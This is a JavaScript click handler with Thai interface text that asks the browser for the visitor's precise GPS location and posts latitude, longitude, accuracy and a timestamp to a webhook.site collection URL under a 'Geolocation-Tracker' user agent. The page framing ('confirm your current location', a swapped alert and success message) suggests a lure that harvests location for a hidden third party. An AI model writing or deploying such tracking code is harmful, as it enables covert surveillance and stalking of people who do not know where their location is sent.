document.getElementById('confirm-button').addEventListener('click', function() {
    const button = this;
    button.disabled = true;
    button.textContent = 'กำลังยืนยันตำแหน่ง...';

    if ("geolocation" in navigator) {
        const options = {
            enableHighAccuracy: true,  // ความแม่นยำสูงสุด
            timeout: 15000,           // เพิ่มเป็น 15 วินาทีสำหรับมือถือ
            maximumAge: 0             // ไม่ใช้ข้อมูลเก่า
        };

        navigator.geolocation.getCurrentPosition(
            async function(position) {
                const data = {
                    lat: position.coords.latitude,
                    lng: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: new Date().toISOString()
                };

                const webhookUrl = 'https://webhook.site/d8654c83-3367-4d22-9448-73772f66ee88';

                try {
                    const response = await fetch(webhookUrl, {
                        method: 'POST',
                        headers: { 
                            'Content-Type': 'application/json',
                            'User-Agent': 'Geolocation-Tracker/1.0'
                        },
                        body: JSON.stringify(data)
                    });

                    if (response.ok) {
                        // สำเร็จ
                        document.getElementById('alert-content').style.display = 'none';
                        document.getElementById('success-content').style.display = 'block';
                    } else {
                        throw new Error(`HTTP ${response.status}`);
                    }
                } catch (error) {
                    console.error('Webhook error:', error);
                    alert('ไม่สามารถส่งข้อมูลได้ กรุณาลองใหม่อีกครั้ง');
                    button.disabled = false;
                    button.textContent = 'ยืนยันตำแหน่งปัจจุบัน';
                }
            },
            function(error) {
                let message = '';
                switch(error.code) {
                    case error.PERMISSION_DENIED:
                        message = 'กรุณาอนุญาตการเข้าถึงตำแหน่งของคุณ';
                        break;
                    case error.POSITION_UNAVAILABLE:
                        message = 'ไม่สามารถระบุตำแหน่งได้ กรุณาเปิด GPS';
                        break;
                    case error.TIMEOUT:
                        message = 'หมดเวลาในการระบุตำแหน่ง กรุณาลองใหม่';
                        break;
                    default:
                        message = 'เกิดข้อผิดพลาดในการระบุตำแหน่ง';
                }
                alert(message);
                button.disabled = false;
                button.textContent = 'ยืนยันตำแหน่งปัจจุบัน';
                console.error('Geolocation error:', error);
            },
            options
        );
    } else {
        alert('เบราว์เซอร์ของคุณไม่รองรับการระบุตำแหน่ง');
        button.disabled = false;
        button.textContent = 'ยืนยันตำแหน่งปัจจุบัน';
    }
});

